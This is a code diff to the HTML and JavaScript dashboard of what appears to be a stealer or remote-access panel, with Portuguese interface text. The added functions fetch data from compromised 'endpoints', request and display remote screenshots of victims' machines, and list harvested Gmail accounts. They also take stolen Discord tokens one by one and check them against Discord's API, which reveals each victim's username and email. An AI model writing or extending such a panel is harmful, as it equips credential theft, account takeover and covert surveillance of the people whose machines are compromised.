@@ -885,6 +885,146 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             document.getElementById(tabName).classList.add('active');
         }
 
+        async function loadEndpointData(endpointId) {
+            try {
+                const response = await fetch(`/api/endpoint_data/${endpointId}`);
+                const data = await response.json();
+                endpointsData[endpointId] = data;
+                return data;
+            } catch (error) {
+                console.error('Error loading endpoint data:', error);
+                return null;
+            }
+        }
+
+        async function loadScreenshots() {
+            try {
+                const response = await fetch('/api/screenshots');
+                const screenshots = await response.json();
+
+                const container = document.getElementById('screenContent');
+                container.innerHTML = '';
+
+                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
+                    const div = document.createElement('div');
+                    div.className = 'screenshot-item';
+                    div.innerHTML = `
+                        <strong>${endpoint_id}</strong><br>
+                        <img src="data:image/png;base64,${screenshot}" alt="Screenshot" style="max-width: 100%; height: auto;">
+                        <br><small>${new Date().toLocaleString()}</small>
+                    `;
+                    container.appendChild(div);
+                });
+
+                if (Object.keys(screenshots).length === 0) {
+                    container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
+                }
+            } catch (error) {
+                console.error('Error loading screenshots:', error);
+            }
+        }
+
+        async function requestScreenshot(endpointId) {
+            try {
+                const response = await fetch(`/api/screenshot_request/${endpointId}`, { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    alert('Solicitacão de screenshot enviada! A captura deve aparecer em alguns segundos.');
+                } else {
+                    alert('Erro ao solicitar screenshot: ' + data.message);
+                }
+            } catch (error) {
+                alert('Erro na solicitacão de screenshot');
+                console.error(error);
+            }
+        }
+
+        async function validateTokensInModal() {
+            const tokenCards = document.querySelectorAll('.token-card');
+            const statusDiv = document.getElementById('tokenValidationStatus');
+            let validCount = 0;
+            
+            statusDiv.textContent = 'Validando tokens...';
+            
+            for (let i = 0; i < tokenCards.length; i++) {
+                const card = tokenCards[i];
+                const token = card.getAttribute('data-token');
+                
+                card.style.background = 'rgba(59, 130, 246, 0.1)';
+                card.innerHTML = `${token}<br><small>Validando...</small>`;
+                
+                try {
+                    const validation = await validateToken(token);
+                    
+                    if (validation.valid) {
+                        card.style.background = 'rgba(34, 197, 94, 0.1)';
+                        card.style.border = '1px solid #22c55e';
+                        card.innerHTML = `
+                            <strong>✅ VÁLIDO</strong><br>
+                            ${token}<br>
+                            <small>👤 ${validation.username}#${validation.discriminator}</small><br>
+                            <small>📧 ${validation.email}</small>
+                        `;
+                        validCount++;
+                    } else {
+                        card.style.background = 'rgba(239, 68, 68, 0.1)';
+                        card.style.border = '1px solid #ef4444';
+                        card.innerHTML = `
+                            <strong>❌ INVÁLIDO</strong><br>
+                            ${token}
+                        `;
+                    }
+                } catch (error) {
+                    card.style.background = 'rgba(239, 68, 68, 0.1)';
+                    card.style.border = '1px solid #ef4444';
+                    card.innerHTML = `
+                        <strong>❌ ERRO</strong><br>
+                        ${token}
+                    `;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            statusDiv.innerHTML = `<strong>Validação concluída: ${validCount}/${tokenCards.length} tokens válidos</strong>`;
+        }
+
+        async function checkGmails(endpointId) {
+            try {
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '🔄 Buscando...';
+                btn.disabled = true;
+                
+                const response = await fetch(`/api/check_gmails/${endpointId}`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    alert(`📧 Gmails encontrados: ${data.gmails.length}\n\n${data.gmails.slice(0, 3).map(g => `• ${g.username}@gmail.com`).join('\n')}${data.gmails.length > 3 ? `\n... e mais ${data.gmails.length - 3}` : ''}`);
+                    
+                    loadEndpoints();
+                } else {
+                    alert('❌ Erro ao buscar Gmails: ' + data.message);
+                }
+            } catch (error) {
+                alert('❌ Erro na requisicão');
+            } finally {
+                btn.textContent = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        async function loadAllData() {
+            try {
+                console.log('Carregando dados...');
+                await loadEndpoints();
+                await loadScreenshots();
+            } catch (error) {
+                console.error('Erro ao carregar dados:', error);
+            }
+        }
+
         async function loadEndpoints() {
             try {
                 const res = await fetch('/api/endpoints');
@@ -1195,6 +1335,48 @@ function selectEndpoint() {
             const modal = document.getElementById('dataModal');
             if (event.target == modal) {
                 modal.style.display = 'none';
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('dataModal').style.display = 'none';
+        }
+
+        function selectEndpoint() {
+            const select = document.getElementById('endpointSelect');
+            currentEndpoint = select.value;
+            const btn = document.getElementById('screenshotBtn');
+            
+            if (currentEndpoint) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+            }
+        }
+
+        async function validateToken(token) {
+            try {
+                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
+                    headers: {
+                        'Authorization': token
+                    }
+                });
+                
+                if (response.ok) {
+                    const user = await response.json();
+                    return {
+                        valid: true,
+                        username: user.username,
+                        id: user.id,
+                        discriminator: user.discriminator,
+                        email: user.email || 'N/A'
+                    };
+                }
+                return { valid: false };
+            } catch (error) {
+                return { valid: false };
             }
         }
     </script>
